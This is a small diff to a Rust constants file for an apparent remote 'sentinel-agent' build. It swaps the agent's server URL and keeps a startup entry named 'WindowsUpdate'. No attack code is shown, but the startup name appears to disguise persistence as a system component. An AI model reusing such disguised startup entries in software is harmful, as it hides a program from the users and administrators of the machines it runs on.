@@ -1,7 +1,7 @@
 // Per-build constants — overwritten by build.py before `cargo build`.
 // The values here are placeholders so the source still compiles standalone.
 pub const OWNER_USER_ID: &str = "";
-pub const SENTINEL_SERVER: &str = "https://project--8a02ea85-360c-49b4-a7be-56a542ae871e-dev.lovable.app";
+pub const SENTINEL_SERVER: &str = "https://project--7b74ebe1-139a-493e-94a5-3e52cba1d8d3-dev.lovable.app";
 pub const BUILD_NAME: &str = "sentinel-agent";
 pub const STARTUP_TASK: bool = false;
 pub const STARTUP_NAME: &str = "WindowsUpdate";
